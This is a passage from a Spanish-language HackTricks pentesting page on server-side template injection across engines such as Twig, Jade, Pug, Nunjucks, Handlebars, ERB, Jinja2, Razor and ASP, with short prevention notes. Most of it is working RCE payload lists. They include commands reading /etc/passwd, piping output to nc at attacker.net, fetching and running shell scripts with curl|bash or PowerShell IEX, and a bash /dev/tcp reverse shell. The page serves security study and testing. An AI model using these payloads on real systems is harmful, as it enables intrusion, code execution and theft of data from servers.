{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - Formato de plantilla**

Twig es un motor de plantillas utilizado en muchos frameworks de PHP, como Symfony. Proporciona una sintaxis clara y segura para generar contenido din√°mico en las aplicaciones web.

Las plantillas Twig se componen de etiquetas y filtros que permiten manipular y mostrar datos. Estas plantillas se procesan en el servidor antes de enviar el contenido al cliente.

Una vulnerabilidad com√∫n en las aplicaciones web es la Inyecci√≥n de Plantillas en el Lado del Servidor (SSTI, por sus siglas en ingl√©s). Esto ocurre cuando los datos proporcionados por el usuario se interpretan como c√≥digo de plantilla y se ejecutan en el servidor.

La SSTI puede permitir a un atacante ejecutar c√≥digo malicioso en el servidor, lo que puede llevar a la ejecuci√≥n remota de comandos, la filtraci√≥n de informaci√≥n confidencial o incluso la toma de control completo del sistema.

Es importante tener en cuenta que la SSTI solo ocurre cuando los datos del usuario se mezclan directamente con el c√≥digo de plantilla sin una validaci√≥n o sanitizaci√≥n adecuada.

Para evitar la SSTI, se deben seguir las mejores pr√°cticas de seguridad, como:

- Validar y sanitizar todos los datos de entrada antes de mezclarlos con el c√≥digo de plantilla.
- Utilizar funciones y filtros seguros proporcionados por Twig para manipular los datos.
- Limitar los privilegios del usuario que ejecuta el c√≥digo de plantilla en el servidor.
- Mantener actualizadas las versiones de Twig y los frameworks que lo utilizan para aprovechar las correcciones de seguridad.

Al comprender y mitigar los riesgos asociados con la SSTI, los desarrolladores pueden garantizar que sus aplicaciones web sean seguras y protegidas contra posibles ataques.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**M√°s informaci√≥n**

* En la secci√≥n Twig y Twig (Sandboxed) de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates est√° inspirado en Twig pero es un motor de plantillas PHP nativo en lugar de un motor de plantillas compilado.

controlador:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
plantilla de p√°gina:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
plantilla de dise√±o:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlib y HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) es lo mismo que PHPlib pero portado a Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Inyecci√≥n de plantillas en el lado del servidor (SSTI)

## Descripci√≥n

Este repositorio contiene ejemplos de c√≥digo para demostrar la vulnerabilidad de inyecci√≥n de plantillas en el lado del servidor (SSTI). La inyecci√≥n de plantillas en el lado del servidor es una vulnerabilidad que permite a un atacante ejecutar c√≥digo arbitrario en el servidor web.

## Configuraci√≥n

1. Clona este repositorio en tu m√°quina local.
2. Configura un servidor web local o utiliza una plataforma en la nube/SaaS como Workspace, AWS o GCP.
3. Copia el archivo `authors.php` en el directorio ra√≠z de tu servidor web.

## Uso

1. Abre el archivo `authors.php` en tu navegador.
2. Ver√°s una lista de autores obtenida de una base de datos.
3. Intenta realizar una inyecci√≥n de plantillas en el campo de b√∫squeda para ejecutar c√≥digo arbitrario en el servidor.

## Prevenci√≥n

Para prevenir la inyecci√≥n de plantillas en el lado del servidor, se recomienda:

- Validar y sanitizar todas las entradas de usuario antes de utilizarlas en plantillas.
- Utilizar un motor de plantillas que tenga mecanismos de seguridad incorporados para prevenir la ejecuci√≥n de c√≥digo arbitrario.
- Limitar los privilegios del usuario que ejecuta el servidor web para minimizar el impacto de una posible explotaci√≥n.

## Contribuci√≥n

Si encuentras alg√∫n problema o tienes alguna sugerencia, si√©ntete libre de abrir un problema o enviar una solicitud de extracci√≥n.

## Descargo de responsabilidad

Este repositorio se proporciona con fines educativos y de prueba de penetraci√≥n. No se debe utilizar para realizar actividades ilegales. El autor no se hace responsable de ning√∫n mal uso o da√±o causado por el uso de este repositorio.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade is a popular template engine for NodeJS that allows you to generate HTML dynamically. However, it is important to be aware of the security risks associated with using Jade, as it can be vulnerable to Server-Side Template Injection (SSTI) attacks.

#### Server-Side Template Injection (SSTI)

Server-Side Template Injection occurs when an attacker is able to inject malicious code into a template that is then executed on the server. This can lead to various security issues, such as remote code execution, information disclosure, and even server compromise.

#### Exploiting SSTI in Jade

To exploit SSTI in Jade, an attacker needs to identify a vulnerable input point where user-supplied data is directly included in the template. This can be a user input field, a query parameter, or any other input mechanism.

Once a vulnerable input point is identified, the attacker can inject template code that will be executed on the server. This code can be used to perform various actions, such as accessing sensitive data, executing system commands, or even modifying the server's configuration.

#### Prevention and Mitigation

To prevent SSTI attacks in Jade, it is important to follow secure coding practices:

- **Input Validation**: Always validate and sanitize user-supplied data before including it in a template. Use proper input validation techniques to ensure that only safe and expected data is processed.

- **Contextual Output Encoding**: When outputting user-supplied data in a template, make sure to encode it properly based on the context. This helps prevent any potential code injection.

- **Least Privilege**: Ensure that the server running the Jade templates has the least privilege necessary to perform its intended functions. Restrict access to sensitive resources and limit the capabilities of the server.

- **Regular Updates**: Keep your Jade template engine and its dependencies up to date. This helps ensure that any security vulnerabilities are patched promptly.

By following these practices, you can reduce the risk of SSTI attacks in Jade and enhance the security of your NodeJS applications.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**M√°s informaci√≥n**

* En la secci√≥n Jade de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) es un motor de plantillas PHP que no compila, que utiliza etiquetas XML para dividir un documento en diferentes partes.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

Traversa de Ruta (m√°s informaci√≥n [aqu√≠](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Error
* ${7\*7} = ${7\*7}
* Nothing
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**M√°s informaci√≥n**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Plantilla** | **Descripci√≥n**                         |
| ------------ | --------------------------------------- |
|              | Evaluar y renderizar la salida              |
|              | Evaluar y renderizar la salida codificada en HTML |
|              | Comentario                                 |
| y          | Permitir c√≥digo (desactivado por defecto)        |

* \= 49

**Lado del cliente**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Lado del Servidor**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**M√°s informaci√≥n**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Ejemplo de renderizado en el servidor**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**M√°s informaci√≥n**

* [https://licenciaparahackear.github.io/es/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/es/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Sin salida
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Error
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**M√°s informaci√≥n**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Consulta la siguiente p√°gina para aprender trucos sobre **ejecuci√≥n de comandos arbitrarios evitando las cajas de arena** en python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**M√°s informaci√≥n**

### Jinja2 (Python)

[Sitio web oficial](http://jinja.pocoo.org)

> Jinja2 es un motor de plantillas completo para Python. Tiene soporte completo para Unicode, un entorno de ejecuci√≥n integrado opcionalmente con sandbox, ampliamente utilizado y con licencia BSD.

* `{{7*7}} = Error`
* `${7*7} = ${7*7}`
* `{{foobar}} Nada`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Formato de plantilla**

Jinja2 es un motor de plantillas para Python que se utiliza com√∫nmente en aplicaciones web. Permite separar la l√≥gica de presentaci√≥n al utilizar archivos de plantilla que contienen marcadores especiales. Estos marcadores se reemplazan por valores din√°micos cuando se renderiza la plantilla.

El formato b√°sico de una plantilla Jinja2 es el siguiente:

```jinja2
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    <p>{{ content }}</p>
</body>
</html>
```

En este ejemplo, `{{ title }}`, `{{ heading }}` y `{{ content }}` son marcadores que ser√°n reemplazados por valores espec√≠ficos cuando se renderice la plantilla. Estos valores pueden provenir de variables en el c√≥digo Python o de datos proporcionados por el usuario.

Jinja2 tambi√©n admite estructuras de control, como bucles y condicionales, que permiten una mayor flexibilidad en la generaci√≥n de contenido din√°mico. Por ejemplo:

```jinja2
<ul>
{% for item in items %}
    <li>{{ item }}</li>
{% endfor %}
</ul>
```

En este caso, el bucle `for` se utiliza para generar una lista `<ul>` con elementos `<li>` basados en los elementos de la variable `items`.

Es importante tener en cuenta que, si no se maneja correctamente, Jinja2 puede ser vulnerable a ataques de inyecci√≥n de plantillas en el lado del servidor (SSTI). Los ataques SSTI pueden permitir a un atacante ejecutar c√≥digo arbitrario en el servidor, lo que puede llevar a la divulgaci√≥n de informaci√≥n confidencial o a la toma de control del sistema. Por lo tanto, es fundamental implementar medidas de seguridad adecuadas al utilizar Jinja2 en aplicaciones web.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE no dependiente de**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**M√°s detalles sobre c√≥mo abusar de Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= √âxito`
* `@() <= √âxito`
* `@("{{code}}") <= √âxito`
* `@ <= √âxito`
* `@{} <= ¬°ERROR!`
* `@{ <= ¬°ERROR!`
* `@(1+2)`
* `@( //C√≥digo C# )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

El m√©todo `System.Diagnostics.Process.Start` de .NET se puede utilizar para iniciar cualquier proceso en el servidor y as√≠ crear una webshell. Puedes encontrar un ejemplo de una aplicaci√≥n web vulnerable en [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**M√°s informaci√≥n**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nada
* `<%= response.write(date()) %>` = \<Fecha>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**M√°s informaci√≥n**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Incluso si es perl, utiliza etiquetas como ERB en Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```
<%= perl code %>
<% perl code %>
```
### SSTI en GO

La forma de confirmar que el motor de plantillas utilizado en el backend es Go es utilizando estos payloads:

* `{{ . }}` = estructura de datos que se pasa como entrada a la plantilla
* Si los datos pasados son un objeto que contiene el atributo Password por ejemplo, el payload anterior lo filtrar√≠a, pero tambi√©n podr√≠as hacer: `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = deber√≠a mostrar la cadena ssti en la respuesta
* `{{html "ssti"}}`, `{{js "ssti"}}` = Estos son algunos otros payloads que deber√≠an mostrar la cadena "ssti" sin las palabras finales "js" o "html". Puedes consultar m√°s palabras clave en el motor [aqu√≠](https://golang.org/pkg/text/template).

**Explotaci√≥n de XSS**

Si el servidor est√° utilizando el paquete **text/template**, es muy f√°cil lograr XSS simplemente proporcionando tu **payload** como entrada. Sin embargo, eso **no es el caso con html/template** ya que codifica HTML en la respuesta: `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

Sin embargo, Go permite **DEFINIR** una **plantilla completa** y luego **llamarla m√°s tarde**. El payload ser√≠a algo como:\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**Explotaci√≥n de RCE**

La documentaci√≥n tanto para el m√≥dulo html/template se puede encontrar [aqu√≠](https://golang.org/pkg/html/template/), y la documentaci√≥n para el m√≥dulo text/template se puede encontrar [aqu√≠](https://golang.org/pkg/text/template/), y s√≠, var√≠an mucho. Por ejemplo, en **text/template**, puedes **llamar directamente cualquier funci√≥n p√∫blica con el valor "call"**, sin embargo, esto no es el caso con html/template.

Si quieres encontrar una RCE en Go a trav√©s de SSTI, debes saber que al acceder al objeto dado a la plantilla con `{{ . }}`, tambi√©n puedes **llamar a los m√©todos del objeto**. Entonces, imagina que el **objeto pasado tiene un m√©todo llamado System** que ejecuta el comando dado, podr√≠as abusar de √©l con: `{{ .System "ls" }}`\
Por lo tanto, probablemente **necesitar√°s el c√≥digo fuente**. Un c√≥digo fuente potencial para algo as√≠ se ver√≠a as√≠:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**M√°s informaci√≥n**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### M√°s exploits

Ver el resto de [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) para m√°s exploits. Tambi√©n puedes encontrar informaci√≥n interesante en las etiquetas en [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Ayuda relacionada

Si crees que podr√≠a ser √∫til, lee:

* [Trucos de Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Funciones m√°gicas de Python](broken-reference/)

## Herramientas

{% embed url="https://github.com/epinna/tplmap" %}

## Lista de detecci√≥n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pr√°ctica y referencias

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro vibrante para profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
